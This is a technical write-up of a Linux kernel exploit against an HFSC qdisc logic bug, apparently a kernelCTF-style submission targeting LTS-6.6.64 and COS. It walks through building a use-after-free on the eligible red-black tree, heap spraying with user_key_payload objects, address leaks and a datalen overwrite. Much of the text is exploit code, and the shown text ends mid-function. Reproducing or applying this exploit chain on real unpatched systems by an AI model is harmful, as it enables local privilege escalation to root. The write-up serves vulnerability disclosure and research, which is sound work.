Exploit Details
===============

In the following, I explain the exploitation process to get a flag on LTS-6.6.64 instance and COS-109-17800.372.84 instance.

# Summary
At at high level, the exploit performs the following things:
- Leverage logic bug to build UAF primitive.
- Use UAF primitive to build heap read primitive.
- Use UAF primitive to build code execution primitive.
- Use heap read primitive to build KASLR leak.
- Use code execution primitive to perform privillege escalation.

# Logic bug
- Describe in the patch (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=647cef20e649c576dff271e018d5d15d998b629d)

# Important note
- Everytime `->enqueue()` return `NET_XMIT_SUCCESS`, `->dequeue()` will be called.
- `->dequeue()` can break the scheduler manipulation process.
- `->dequeue()` will return early if `sch->q.qlen == 0`.
- Consider the dequeue flow like: `->dequeue(Qdisc_A)` -> `->dequeue(Qdisc_B)` -> `->dequeue(Qdisc_C)`, any Qdisc with `qlen == 0` will keep the dequeue process out of the way.

# Build UAF primitive
Before diving into the exploit code flow, I will describe the UAF primitive first. The UAF primitive is built using two functions:
- Function `prepare_uaf()` [[exploit.c#L968]](../exploit/lts-6.6.64/exploit.c#L968)
- Function `trigger_uaf()` [[exploit.c#L1020]](../exploit/lts-6.6.64/exploit.c#L1020)

Before describe how `prepare_uaf()` function and `trigger_uaf()` function work, we need to take a look at two kernel code flows:
- Flow1: `hfsc_enqueue()` -> `init_ed()` -> `eltree_insert()`
- Flow2: `hfsc_change_class()` -> `update_ed()` -> `eltree_update()` -> `eltree_remove()` -> `eltree_insert()`

```c
static void
eltree_insert(struct hfsc_class *cl)
{
	struct rb_node **p = &cl->sched->eligible.rb_node;
	struct rb_node *parent = NULL;
	struct hfsc_class *cl1;

	while (*p != NULL) {
		parent = *p;
		cl1 = rb_entry(parent, struct hfsc_class, el_node);
		if (cl->cl_e >= cl1->cl_e)
			p = &parent->rb_right;
		else
			p = &parent->rb_left;
	}
	rb_link_node(&cl->el_node, parent, p);
	rb_insert_color(&cl->el_node, &cl->sched->eligible);
}
```
- Function `eltree_insert()` insert an `hfsc_class` object to the eligible tree.

```c
static inline void
eltree_remove(struct hfsc_class *cl)
{
	rb_erase(&cl->el_node, &cl->sched->eligible);
}
```
- Function `eltree_remove` remove an `hfsc_class` object from the eligible tree

```c
static void
init_ed(struct hfsc_class *cl, unsigned int next_len)
{
        /* Writeup note: Deleted code for clarity */
	eltree_insert(cl);
}
```

```c
static inline void
eltree_update(struct hfsc_class *cl)
{
	eltree_remove(cl);
	eltree_insert(cl);
}
```
## Idea that lead to UAF primitive
- Let's say we have an `hfsc_class` object and called it 'A'.
- As you can see, the expected code flow is Flow1 always happened before Flow2. That means, `init_ed()` is called first to
insert 'A' to the red black tree. Later when Flow2 happened, 'A' is modified and `update_ed()` is called that first remove 'A' from
the red black tree and then insert to the tree again.
- I found a way to leverage the logic bug to trigger Flow2 before Flow1. That means, `update_ed()` is called before `init_ed()` and
eventually we reach the following code flow: `eltree_remove()` -> `eltree_insert()` -> `eltree_insert()`. This is implemented in `prepare_uaf()`.
- First `eltree_insert()` called:
```c
A->el_node->__rb_parent_color == (0 | RB_BLACK);
A->el_node->rb_right == NULL;
A->el_node->rb_left == NULL;
cl->sched->eligibe.rb_node == &(A->el_node);
```
- Second `eltree_insert()` called:
```c
A->el_node->__rb_parent_color == &(A->el_node);
A->el_node->rb_right == NULL;
A->el_node->rb_left == &(A->el_node);
cl->sched->eligibe.rb_node == &(A->el_node);
```
- Now, I can delete object 'A' and still leave a dangling pointer in `sched->eligible.rb_node`. This is implemented in `trigger_uaf()`.

### Describe `prepare_uaf()` function
#### The function takes 7 parameters:
	1. struct mnl_socket *route_socket : basically a netlink route socket.
	2. int packet_socket : a packet socket created by `socket(AF_PACKET, SOCK_RAW, 0)`.
	3. int ifindex : a dummy network interface index. This network interface must have mtu < IPV6_MIN_MTU
	4. u32 qdisc_A_handle : handle for qdisc_A creation.
	5. u32 qdisc_B_handle : handle for qdisc_B creation.
	6. u32 qdisc_C_handle : handle for qdisc_C creation.
	7. u32 classid_A : classid for an `hfsc_class` object.
#### Steps perform by `prepare_uaf()` function:
Step1: Create Qdisc_A [[exploit.c#L979]](../exploit/lts-6.6.64/exploit.c#L979)
```c
struct tc_hfsc_qopt hfsc_qopt_A = { .defcls = 0 };
create_hfsc_qdisc(route_socket, ifindex, TC_H_ROOT, qdisc_A_handle, &hfsc_qopt_A);
```
- After step1, we have the following things:
	1. Qdisc_A(root qdisc, handle: qdisc_A_handle, type: `hfsc`).
	2. A root class (classid: qdisc_A_handle, type: `hfsc_class`). This class is created in `hfsc_init_qdisc()` kernel function which is called in the `hfsc` qdisc creation process.
	3. Because we set `defcls` to 0, we configured qdisc to route packet to qdisc linked with root class.

Step2: Create Qdisc_C [[exploit.c#L989]](../exploit/lts-6.6.64/exploit.c#L989)
```c
struct tc_fifo_qopt pfifo_head_drop_qopt_C = { .limit = 0 };
create_pfifo_head_drop_qdisc(
	route_socket,
	ifindex,
	qdisc_A_handle,
	qdisc_C_handle,
	&pfifo_head_drop_qopt_C
);
```
- After step2, we have the following things:
	1. Qdisc_C(parent: Qdisc_A, handle: qdisc_C_handle, type: `pfifo_head_drop`).
	2. Qdisc_C has `sch->limit == 0`.
	3. Qdisc_C is linked to root class of Qdisc_A. This is done by function `hfsc_graft_class()` in the kernel.

Step3: Trigger packet enqueue [[exploit.c#L983]](../exploit/lts-6.6.64/exploit.c#L983)
```c
trigger_qdisc_enqueue(packet_socket, ifindex);
```

- Packet flow of step3: `hfsc_enqueue(Qdisc_A)` -> `pfifo_tail_enqueue(Qdisc_C)`.
- After step3, we have the following things:
	1. Qdisc_A->q.qlen == 0.
	2. Qdisc_C->q.qlen == 1.

Step4: Delete Qdisc_C [[exploit.c#L990]](../exploit/lts-6.6.64/exploit.c#L990)
```c
delete_qdisc(route_socket, ifindex, qdisc_A_handle, qdisc_C_handle);
```

- After step4, we have the following things:
	1. Qdisc_A->q.qlen == -1.
	2. Currently Qdisc_A has no packet in the queue.

Step5: Create class_A object [[exploit.c#L992]](../exploit/lts-6.6.64/exploit.c#L992)
```c
struct tc_service_curve rsc_A = { .m1 = 1 };
create_hfsc_class(route_socket, ifindex, qdisc_A_handle, classid_A, &rsc_A, NULL, NULL);
```

- After step5, we have the following things:
	1. class_A object(classid: classid_A, type: `hfsc_class`, flags: `HFSC_RSC`).

Step6: Create Qdisc_B [[exploit.c#L994]](../exploit/lts-6.6.64/exploit.c#L994)
```c
struct tc_hfsc_qopt hfsc_qopt_B = { .defcls = 0 };
create_hfsc_qdisc(route_socket, ifindex, classid_A, qdisc_B_handle, &hfsc_qopt_B);
```
- After step6, we have the following things:
	1. Qdisc_B(parent: Qdisc_A, handle: qdisc_B_handle, type: `hfsc`).
	2. Same as step1, Qdisc_B will have its own root class.
	3. `defcls` is set to 0 will lead to Qdisc_B route enqueued packet to qdisc linked with its root class.
	4. Qdisc_B is linked with class_A object(classid: classid_A).

Step7: Create Qdisc_C [[exploit.c#L995]](../exploit/lts-6.6.64/exploit.c#L995)
```c
create_pfifo_head_drop_qdisc(
	route_socket,
	ifindex,
	qdisc_B_handle,
	qdisc_C_handle,
	&pfifo_head_drop_qopt_C
);
```

- After step7, we have the following things:
	1. Qdisc_C(parent: Qdisc_B, handle: qdisc_C_handle, type: `pfifo_head_drop`).
	2. Qdisc_C has `sch->limit == 0`.
	3. Qdisc_C is linked with root class of Qdisc_B.

- Step8: Modify Qdisc_A route [[exploit.c#L1003]](../exploit/lts-6.6.64/exploit.c#L1003)
```c
change_hfsc_qdisc_route(route_socket, ifindex, TC_H_ROOT, qdisc_A_handle, classid_A);
```

```c
void change_hfsc_qdisc_route(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
	u32 route_to_classid
)
{
	struct tc_hfsc_qopt hfsc_qopt = { .defcls = route_to_classid };
	change_hfsc_qdisc(route_socket, ifindex, tcm_parent, tcm_handle, &hfsc_qopt);
}
```

- After step8, we have the following things:
	1. Qdisc_A route is modified to route enqueued packet through qdisc linked with class_A object.

Step9: Trigger packet enqueue [[exploit.c#L1004]](../exploit/lts-6.6.64/exploit.c#L1004)
```c
trigger_qdisc_enqueue(packet_socket, ifindex);
```

- Packet flow of step9: `hfsc_enqueue(Qdisc_A)` -> `hfsc_enqueue(Qdisc_B)` -> `pfifo_tail_enqueue(Qdisc_C)`.
- After step9, we have the following things:
	1. Qdisc_C->q.qlen == 1.
	2. Qdisc_B->q.qlen == 0.
	3. Qdisc_A->q.qlen == -1.

Step10: Delete Qdisc_C [[exploit.c#L1005]](../exploit/lts-6.6.64/exploit.c#L1005)
```c
delete_qdisc(route_socket, ifindex, qdisc_B_handle, qdisc_C_handle);
```

- After step10, we have the following things:
	1. Qdisc_B->q.qlen == -1.
	2. Qdisc_A->q.qlen == -2.

Step11: Create Qdisc_C [[exploit.c#L1007]](../exploit/lts-6.6.64/exploit.c#L1007)
```c
pfifo_head_drop_qopt_C.limit = 0xFFFFFFFF;
create_pfifo_head_drop_qdisc(
	route_socket,
	ifindex,
	qdisc_B_handle,
	qdisc_C_handle,
	&pfifo_head_drop_qopt_C
);
```

- After step11, we have the following things:
	1. Qdisc_C (parent: Qdisc_B, handle: qdisc_C_handle, type: `pfifo_head_drop`).
	2. Qdisc_C has `sch->limit == 0xFFFFFFFF`.

Step12: Trigger Flow2 described in idea [[exploit.c#L1015]](../exploit/lts-6.6.64/exploit.c#L1015)
```c
change_hfsc_class(route_socket, ifindex, qdisc_A_handle, classid_A, &rsc_A, NULL, NULL);
```

Take a look at kernel function `hfsc_change_class()`:
```c
static int
hfsc_change_class(struct Qdisc *sch, u32 classid, u32 parentid,
		  struct nlattr **tca, unsigned long *arg,
		  struct netlink_ext_ack *extack)
{
	struct hfsc_sched *q = qdisc_priv(sch);
	struct hfsc_class *cl = (struct hfsc_class *)*arg;
	/* Writeup note: Deleted code for clarity */

	if (cl != NULL) {
		/* Writeup note: Deleted code for clarity */
		sch_tree_lock(sch);
		old_flags = cl->cl_flags;

		if (rsc != NULL)
			hfsc_change_rsc(cl, rsc, cur_time);

		if (cl->qdisc->q.qlen != 0) {
			int len = qdisc_peek_len(cl->qdisc);

			if (cl->cl_flags & HFSC_RSC) {
				if (old_flags & HFSC_RSC)
					update_ed(cl, len);
				else
					init_ed(cl, len);
			}
		}
		sch_tree_unlock(sch);

		return 0;
	}
	/* Writeup note: Deleted code for clarity */
}
```

- `cl` is class_A created in step5.
- `cl->qdisc` is Qdisc_B.
- Qdisc_B->q.qlen == -1 	=> 	cl->qdisc->q.qlen != 0
- We reach `update_ed()` call as describe in idea.

Step13: Trigger Flow1 described in idea [[exploit.c#L1016]](../exploit/lts-6.6.64/exploit.c#L1016)
```c
trigger_qdisc_enqueue(packet_socket, ifindex);
trigger_qdisc_enqueue(packet_socket, ifindex);
```
- Because Qdisc_C has `sch->limit == 0xFFFFFFFF`, the packet enqueue process will success (return `NET_XMIT_SUCCESS`).
- Packet flow of first `trigger_qdisc_enqueue()` call: `hfsc_enqueue(Qdisc_A)` -> `hfsc_enqueue(Qdisc_B)` -> `pfifo_tail_enqueue(Qdisc_C)`
- After first `trigger_qdisc_enqueue()` call, we have the following things:
	1. Qdisc_A->q.qlen == -1.
	2. Qdisc_B->q.qlen == 0.
	3. Qdisc_C->q.qlen == 1.
- Because `->enqueue()` return `NET_XMIT_SUCCESS`, `->dequeue()` will be called.
- Because `Qdisc_B->q.qlen == 0`, when dequeue flow go from `hfsc_dequeue(Qdisc_A) -> hfsc_dequeue(Qdisc_B)`, dequeue flow stop. This ensure we can keep `rb_tree` layout as expected.
- The second `trigger_qdisc_enqueue()` call will trigger Flow1.


- Packet flow of second `trigger_qdisc_enqueue()` call: `hfsc_enqueue(Qdisc_A)` -> `hfsc_enqueue(Qdisc_B)` -> `pfifo_tail_enqueue(Qdisc_C)`
- Take a look at `hfsc_enqueue()` kernel function:
```c
static int
hfsc_enqueue(struct sk_buff *skb, struct Qdisc *sch, struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct hfsc_class *cl;
	int err;
	bool first;

	cl = hfsc_classify(skb, sch, &err);
	/* Writeup note: Deleted code for clarity */

	first = !cl->qdisc->q.qlen;
	err = qdisc_enqueue(skb, cl->qdisc, to_free);
	/* Writeup note: Deleted code for clarity */

	if (first) {
		if (cl->cl_flags & HFSC_RSC)
			init_ed(cl, len);
		/* Writeup note: Deleted code for clarity */
	}

	sch->qstats.backlog += len;
	sch->q.qlen++;

	return NET_XMIT_SUCCESS;
}
```
- When `hfsc_enqueue(Qdisc_A)` is called, `cl` represent `class_A` object and `cl->qdisc` represent `Qdisc_B`.
- `Qdisc_B->q.qlen == 0`	=> 	`first == true`.
- We reach `init_ed()` as described in idea.
- qlen value of each Qdisc after this step:
	1. Qdisc_A->q.qlen == 0.
	2. Qdisc_B->q.qlen == 1.
	3. Qdisc_C->q.qlen == 2.
- Because `Qdisc_A->q.qlen == 0`, we can keep `hfsc_dequeue(Qdisc_A)` out of the way and maintain the `rb_tree` layout in control.

### Describe `trigger_uaf()` function
[[exploit.c#L1020]](../exploit/lts-6.6.64/exploit.c#L1020)
```c
static inline void trigger_uaf(struct mnl_socket *route_socket, int ifindex, u32 hfsc_classid)
{
	delete_tclass(route_socket, ifindex, TC_H_MAJ(hfsc_classid), hfsc_classid);	
}
```

- As described in idea, when we want to trigger uaf, we just need to delete `class_A` object.
- After `trgger_uaf()`, `Qdisc_A->q.qlen == -1`.

# Build heap read primitive
- The head read primitive is built using 4 functions: 
	1. heap_read_primitive_init()
	2. heap_read_primitive_setup_network_interfaces()
	3. heap_read_primitive_build_primitive()
	4. heap_read_primitive_trigger()
	5. heap_read_primitive_reset()

## Describe function `heap_read_primitive_init()`
[[exploit.c#L1025]](../exploit/lts-6.6.64/exploit.c#L1025)
- Function `heap_read_primitive_init()` perform the following things:
	1. Create NETLINK_ROUTE socket.
	2. Create raw packet socket.
	3. Prepare 3 qdisc handle and 4 classid.
	4. Prepare parameters for `struct user_key_payload` kernel object allocation.

## Describe function `heap_read_primitive_setup_network_interfaces()`
[[exploit.c#L1077]](../exploit/lts-6.6.64/exploit.c#L1077)
- Function `heap_read_primitive_setup_network_interfaces()` perform the following things:
	1. Create dummy network interface with `mtu == IPV6_MIN_MTU - 1` to avoid `ipv6_add_dev()` call in kernel. Reason:
		- `ipv6_add_dev()` -> `timer_setup(&ndev->rs_timer, addrconf_rs_timer, 0)`
		- `addrconf_rs_timer()` -> `ndisc_send_rs()` -> `ndisc_send_skb()`
		- `ndisc_send_skb()` will lead to packet send to network interface and trigger `sch->enqueue()`. This will mess with the scheduler manipulation process.
	2. Set the dummy network interface status to up.

## Describe function `heap_read_primitive_build_primitive()`
[[exploit.c#L1089]](../exploit/lts-6.6.64/exploit.c#L1089)
### Step1: Trigger uaf primitive [[exploit.c#L1095]](../exploit/lts-6.6.64/exploit.c#L1095)
```c
prepare_uaf(
	heap_read_primitive->route_socket,
	heap_read_primitive->raw_packet_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_qdisc_B_handle,
	heap_read_primitive->rb_tree_interface_qdisc_C_handle,
	heap_read_primitive->rb_tree_interface_classid_A
);

trigger_uaf(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_classid_A
);
```

- Take a look at kernel function `eltree_insert()`:
```c
static void
eltree_insert(struct hfsc_class *cl)
{
	struct rb_node **p = &cl->sched->eligible.rb_node;
	struct rb_node *parent = NULL;
	struct hfsc_class *cl1;

	while (*p != NULL) {
		parent = *p;
		cl1 = rb_entry(parent, struct hfsc_class, el_node);
		if (cl->cl_e >= cl1->cl_e)
			p = &parent->rb_right;
		else
			p = &parent->rb_left;
	}
	rb_link_node(&cl->el_node, parent, p);
	rb_insert_color(&cl->el_node, &cl->sched->eligible);
}
```

- The dangling pointer is `cl->sched->eligible.rb_node` and has type `struct rb_node`.
- This pointer actually point at `el_node` member of `struct hfsc_class` object.
- `struct hfsc_class` object is allocated on kmalloc-1024.
- `->cl_e` member will decide which pointer is touched: `->rb_right` or `->rb_left`.
- I will refer to `struct rb_node` object as `UAF_rb_node`.
- I will refer to `struct hfsc_class` object as `UAF_hfsc_class`.
- I will refer to the qdisc that have UAF pointer as `Victim_Qdisc`.
- Important note: further process is setup in such a way that every time `eltree_insert()` is triggered, we always follow `->rb_right`.

### Step2: Reclaim `UAF_hfsc_class` with `struct user_key_payload` object.
[[exploit.c#L1111]](../exploit/lts-6.6.64/exploit.c#L1111)
```c
fake_rb_node = (struct rb_node *)
	(	
		user_key_payload_write_buffer + \
		struct_hfsc_class_member_el_node_offset - \
		sizeof(struct user_key_payload)
	);

fake_rb_node->__rb_parent_color = 0 | RB_BLACK;
fake_rb_node->rb_right = (struct rb_node *)(0);
fake_rb_node->rb_left = (struct rb_node *)(0);

heap_read_primitive->key_A = user_key_payload_alloc(
	heap_read_primitive->key_A_desc,
	user_key_payload_write_buffer,
	sizeof(user_key_payload_write_buffer)
);
```
- Let's call this `struct user_key_payload` as `user_key_payload_A`. Reclaim success will lead to:
```c
UAF_rb_node->__rb_parent_color == NULL | RB_BLACK;
UAF_rb_node->rb_right == NULL;
UAF_rb_node->rb_left == NULL;
UAF_hfsc_class->cl_e == 0;
```

### Step3: Leak `struct hfsc_class` object heap address by perform the following things:
- Create `struct hfsc_class` object with `HFSC_RSC` flag. Let's call this class_B. There's a default qdisc linked with class_B in the creation process.
[[exploit.c#L1128]](../exploit/lts-6.6.64/exploit.c#L1128)
```c
struct tc_service_curve rsc_B = { .m1 = 1, .m2 = 1, .d = 0 };
create_hfsc_class(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_B,
	&rsc_B,
	NULL,
	NULL
);
```
- Configure `Victim_Qdisc` to route enqueued packet to qdisc linked with class_B. [[exploit.c#L1139]](../exploit/lts-6.6.64/exploit.c#L1139)
```c
change_hfsc_qdisc_route(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	TC_H_ROOT,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_B
);
```
- Enqueue new packet throught `Victim_Qdisc` will eventually lead to `init_ed(class_B)` -> `eltree_insert(class_B)`.
After the enqueue process success, `Victim_Qdisc->q.qlen == 0`. Therefore, we can keep `->dequeue()` out of the way and keep `class_B` object on the tree.
[[exploit.c#L1147]](../exploit/lts-6.6.64/exploit.c#L1147)
```c
trigger_qdisc_enqueue(
	heap_read_primitive->raw_packet_socket,
	heap_read_primitive->rb_tree_interface_ifindex
);
```
- Read `UAF_rb_node->rb_right` to leak `&(class_B->cl_e)` address. Subtract `cl_e` member offset to get `class_B` address. Let's call this leaked address as `hfsc_class_leak_address`.
[[exploit.c#L1152]](../exploit/lts-6.6.64/exploit.c#L1152)
```c
user_key_payload_read(
	heap_read_primitive->key_A,
	user_key_payload_read_buffer,
	sizeof(user_key_payload_read_buffer)
);

fake_rb_node = (struct rb_node *)
	(
		user_key_payload_read_buffer + \
		struct_hfsc_class_member_el_node_offset - \
		sizeof(struct user_key_payload)
	);

u64 hfsc_class_leak_address = (u64)fake_rb_node->rb_right - struct_hfsc_class_member_el_node_offset;
```

### Step4: Build a fake rb_tree with 2 rb_node
#### First rb_node is built with the following steps:
- Delete `class_B`. This will remove `&(class_B->el_node)` from the tree. After this, `Victim_Qdisc->q.qlen == -1`.
	[[exploit.c#L1169]](../exploit/lts-6.6.64/exploit.c#L1169)
```c
delete_tclass(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	TC_H_MAJ(heap_read_primitive->rb_tree_interface_classid_B),
	heap_read_primitive->rb_tree_interface_classid_B
);
```
- Allocate `struct user_key_payload` object to reclaim. Let's call this object `fake_hfsc_class_backed_by_user_key_payload_B`.
We know kernel address of `user_key_payload_B` (same as hfsc_class_leak_address).
[[exploit.c#L1176]](../exploit/lts-6.6.64/exploit.c#L1176)
```c
memset(user_key_payload_write_buffer, 0, sizeof(user_key_payload_write_buffer));
heap_read_primitive->key_B = user_key_payload_alloc(
	heap_read_primitive->key_B_desc,
	user_key_payload_write_buffer,
	sizeof(user_key_payload_write_buffer)
);
```

#### Second rb_node is built with the following steps:
- Prepare data for further `user_key_payload` spray [[exploit.c#L1182]](../exploit/lts-6.6.64/exploit.c#L1182)
```c
memset(user_key_payload_write_buffer, 0, sizeof(user_key_payload_write_buffer));
fake_rb_node = (struct rb_node *)
	(
		user_key_payload_write_buffer + \
		struct_hfsc_class_member_el_node_offset - \
		sizeof(struct user_key_payload)
	);

fake_rb_node->__rb_parent_color = 0 | RB_BLACK;
fake_rb_node->rb_right = (struct rb_node *)(0);
fake_rb_node->rb_left = (struct rb_node *)
	(
		hfsc_class_leak_address + \
		sizeof(struct user_key_payload) - \
		(
			struct_user_key_payload_member_data_offset - \
			struct_user_key_payload_member_datalen_offset
		)
	);
```
- Free `user_key_payload_A`. Remember, currently `user_key_payload_A` is used to reclaim UAF pointer.
[[exploit.c#L1202]](../exploit/lts-6.6.64/exploit.c#L1202)
```c
user_key_payload_free_and_wait_for_gc(&(heap_read_primitive->key_A));
```

```c
void user_key_payload_free_and_wait_for_gc(key_serial_t *pkey)
{
	if (*pkey != -1) {
		Keyctl_unlink(*pkey, KEY_SPEC_USER_KEYRING);
		u32 x = 0;
		for (u32 i = 0; i < 0xFFFFFFFF; i++)
			x += i;
		*pkey = -1;
	}
}
```

- Spray many `struct user_key_payload` objects with data prepare above. I need to spray because sometime the slab contain `UAF_hfsc_class` is not active any more.
[[exploit.c#L1204]](../exploit/lts-6.6.64/exploit.c#L1204)
```c
for (u32 i = 0; i < heap_read_primitive->key_spray_count; i++) {
	heap_read_primitive->key_spray[i] = user_key_payload_alloc(
		heap_read_primitive->key_spray_descs[i],
		user_key_payload_write_buffer,
		sizeof(user_key_payload_write_buffer)
	);
}
```
- The `UAF_rb_node` look like this:
```c
UAF_rb_node->__rb_parent_color == NULL | RB_BLACK;
UAF_rb_node->rb_right == NULL;
UAF_rb_node->rb_left == hfsc_class_leak_address + sizeof(struct user_key_payload) - 8;
UAF_hfsc_class->cl_e == 0;
```
- `hfsc_class_leak_address + sizeof(struct user_key_payload) - 8` is actually the address of `&(fake_hfsc_class_backed_by_user_key_payload_B->datalen)`.
- Because I choose to allocate `fake_hfsc_class_backed_by_user_key_payload_B` with `datalen == 0x200`, this `rb_node` will be considered as `RB_RED` node.

### Step5: Add a node to `UAF_rb_node->rb_right` by doing the following things:
- Create `struct hfsc_class` object with `HFSC_RSC` flag. Let's call this class_C. There's a default qdisc linked with class_C in the creation process.
[[exploit.c#L1212]](../exploit/lts-6.6.64/exploit.c#L1212)
```c
struct tc_service_curve rsc_C = { .m1 = 1, .m2 = 1, .d = 0 };
create_hfsc_class(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_C,
	&rsc_C,
	NULL,
	NULL
);
```
- Configure `Victim_Qdisc` to route enqueued packet to qdisc linked with class_C.
[[exploit.c#L1222]](../exploit/lts-6.6.64/exploit.c#L1222)
```c
change_hfsc_qdisc_route(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	TC_H_ROOT,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_C
);
```
- Enqueue new packet throught `Victim_Qdisc` will eventually lead to `init_ed(class_C)` -> `eltree_insert(class_C)`.
[[exploit.c#L1229]](../exploit/lts-6.6.64/exploit.c#L1229)
```c
trigger_qdisc_enqueue(heap_read_primitive->raw_packet_socket, heap_read_primitive->rb_tree_interface_ifindex);
```
- After the enqueue process success, `Victim_Qdisc->q.qlen == 0`. Therefore, we can keep `->dequeue()` out of the way and keep `class_C` object on the tree.
- Now, the `UAF_rb_node` look liks this:
```c
UAF_rb_node->__rb_parent_color == NULL | RB_BLACK;
UAF_rb_node->rb_right == &(class_C->el_node);
UAF_rb_node->rb_left == &(fake_hfsc_class_backed_by_user_key_payload_B->datalen);
```

### Step6: Findout which `user_key_payload` object sprayed from Step4 that overlapped with `UAF_rb_node`
[[exploit.c#L1231]](../exploit/lts-6.6.64/exploit.c#L1231)
- Read each `user_key_payload` data and look for `UAF_rb_node->rb_right` heap address.
```c
bool found_reclaim_key = false;
for (u32 i = 0; i < heap_read_primitive->key_spray_count && !found_reclaim_key; i++) {
	user_key_payload_read(
		heap_read_primitive->key_spray[i],
		user_key_payload_read_buffer,
		sizeof(user_key_payload_read_buffer)
	);

	fake_rb_node = (struct rb_node *)
		(
			user_key_payload_read_buffer + \
			struct_hfsc_class_member_el_node_offset - \
			sizeof(struct user_key_payload)
		);
	
	if (fake_rb_node->rb_right) {
		reclaim_key = heap_read_primitive->key_spray[i];
		found_reclaim_key = true;
	}
}
```

### Step7: Free unnecessary `user_key_payload` object
[[exploit.c#L1256]](../exploit/lts-6.6.64/exploit.c#L1256)
```c
for (u32 i = 0; i < heap_read_primitive->key_spray_count; i++)
	if (heap_read_primitive->key_spray[i] != reclaim_key)
		user_key_payload_free(&(heap_read_primitive->key_spray[i]));
```

### Step8: Trigger the `&(hfsc_class_backed_by_user_key_payload_B->datalen)` overwrite.
- This step leverage this kernel code path for the overwritten process: `init_ed()` -> `eltree_insert()` -> `rb_link_node()` -> `rb_insert_color()` -> `__rb_insert()`

```c
static __always_inline void
__rb_insert(struct rb_node *node, struct rb_root *root,
	    void (*augment_rotate)(struct rb_node *old, struct rb_node *new))
{
	struct rb_node *parent = rb_red_parent(node), *gparent, *tmp;

	while (true) {
		if (unlikely(!parent)) {
			rb_set_parent_color(node, NULL, RB_BLACK);
			break;
		}

		if(rb_is_black(parent))
			break;

		gparent = rb_red_parent(parent);

		tmp = gparent->rb_right;
		if (parent != tmp) {
			if (tmp && rb_is_red(tmp)) {
				/* Writeup note: Ignore code here */
			}

			tmp = parent->rb_right;
			if (node == tmp) {
				/* Writeup note: Ignore code here */
			}

				/* Writeup note: Ignore code here */
			break;
		} else {
			tmp = gparent->rb_left;
			if (tmp && rb_is_red(tmp)) {
				rb_set_parent_color(tmp, gparent, RB_BLACK); // THIS IS OUR PRIMITIVE
				rb_set_parent_color(parent, gparent, RB_BLACK);
				node = gparent;
				parent = rb_parent(node);
				rb_set_parent_color(node, parent, RB_RED);
				continue;
			}

			tmp = parent->rb_left;
			if (node == tmp) {
				/* Writeup note: Ignore code here */
			}

				/* Writeup note: Ignore code here */
			break;
		}
	}
}
```
- The primitive we need is `rb_set_parent_color(tmp, gparent, RB_BLACK)`.

```c
static inline void rb_set_parent_color(struct rb_node *rb,
				       struct rb_node *p, int color)
{
	rb->__rb_parent_color = (unsigned long)p | color;
}
```

- Because `rb->__rb_parent_color` is `&(hfsc_class_backed_by_user_key_payload_B->datalen)`, we overwrite `datalen` with a kernel address.
#### Describe implementation:
- Create `struct hfsc_class` object with `HFSC_FSC` flag. Let's call this class_D.
[[exploit.c#L1260]](../exploit/lts-6.6.64/exploit.c#L1260)
```c
struct tc_service_curve fsc_D = { .m1 = 1, .m2 = 1, .d = 0 };
create_hfsc_class(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_D,
	NULL,
	&fsc_D,
	NULL
);
```

- Create Qdisc with `pfifo_head_drop` as type and have `sch->limit == 0` and linked with `class_D`. We will reuse the logic bug here.
[[exploit.c#L1271]](../exploit/lts-6.6.64/exploit.c#L1271)
```c
struct tc_fifo_qopt pfifo_head_drop_qopt_C = { .limit = 0 };
create_pfifo_head_drop_qdisc(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	heap_read_primitive->rb_tree_interface_classid_D,
	heap_read_primitive->rb_tree_interface_qdisc_C_handle,
	&pfifo_head_drop_qopt_C
);
```
- Configure `Victim_Qdisc` to route enqueued packet to qdisc linked with `class_D`.
[[exploit.c#L1279]](../exploit/lts-6.6.64/exploit.c#L1279)
```c
change_hfsc_qdisc_route(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
	TC_H_ROOT,
	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_D
);
```
- Enqueue packet to `Victim_Qdisc` to trigger the logic bug.
[[exploit.c#L1286]](../exploit/lts-6.6.64/exploit.c#L1286)
```c
trigger_qdisc_enqueue_with_bigger_packet(heap_read_primitive->raw_packet_socket, heap_read_primitive->rb_tree_interface_ifindex);
```
- `trigger_qdisc_enqueue_with_bigger_packet()` send a packet bigger in size than `trigger_qdisc_enqueue()`. The packet size is part of `->cl_e` calculation process.
- Testing with this setup showed that we always followed `->rb_right` as expected.
- Back when the exploit use `trigger_qdisc_enqueue()` here instead, sometimes the exploit fail because it followed `->rb_left` (testing showed 90% -> 100% success)
- Now, Qdisc_C->q.qlen == 1. This is the qdisc linked with `class_D`.
- Modify class_D object from `HFSC_FSC` flag to `HFSC_RSC` flag to trigger this kernel code path: `hfsc_change_class()` -> `init_ed()`. Overwrite primitive achieved.
[[exploit.c#L1288]](../exploit/lts-6.6.64/exploit.c#L1288)
```c
struct tc_service_curve rsc_D = { .m1 = 1, .m2 = 1, .d = 0 };
change_hfsc_class(
	heap_read_primitive->route_socket,
	heap_read_primitive->rb_tree_interface_ifindex,
